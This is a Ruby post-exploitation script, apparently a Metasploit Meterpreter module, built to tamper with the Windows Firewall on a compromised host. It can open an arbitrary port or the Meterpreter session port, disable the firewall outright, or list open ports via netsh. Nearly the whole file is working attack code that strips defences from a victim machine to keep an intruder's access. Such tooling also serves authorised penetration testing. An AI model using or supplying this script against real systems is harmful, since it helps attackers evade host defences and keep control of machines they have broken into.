# Dynamic load of the winfirewall-api.rb 
def dynamic_require path
    $".delete path if $".include? path
    require path
end

winfirewall_api_path = "#{ENV[:BASE]}/msf3/scripts/meterpreter/winfirewall-api.rb"
dynamic_require winfirewall_api_path

def console_show_open_port_entries session
    config = execute_cmd_with_channel "netsh firewall show portopening"
    
    config[:channel].split("\n").each do |o|
      print_status o
    end 
end

def console_disable_firewall session
    config = read_firewall_config session
    if config[:firewall_state] == "inactive"
        print_status "Firewall isn't running"
        raise Rex::Script::Completed
    end
    
    print_status "Disabling Firewall ..."
    disable_firewall session
end

def console_open_firewall_port(port, session)
    config = read_firewall_config session
    if config[:firewall_state] == "inactive"
        print_status("Firewall is inactive")
        print_status("Altering the Portconfig may not be necessary")
        print_status("Proceed? (Yes/No)")
        input = STDIN.gets
        if input.downcase.include? "no"
          print_status "Firewall Config will be left unchanged"
          raise Rex::Script::Completed
        end
    end
    
    if config[:tcp] && (config[:tcp].include? port)
        print_status("Port is already open")
        raise Rex::Script::Completed
    end	
	open_port session, port	
	console_show_open_port_entries session
end

port = nil
case args[0]
when "-p"
  if args[1]
    port = args[1]
  else
    port ||= session.sock.peerport
  end
  print_status("Try to Open Port #{port}")
  console_open_firewall_port port, client
when "-d"
  console_disable_firewall client
when "-s"
  console_show_open_port_entries client
else    
    print_status "Usage:" 
    print_status "-p [port] Opens a specified Port or the Meterpreter-Session Port"
    print_status "-d Disables the Windows Firewall"
    print_status "-s Show Open Ports"
end
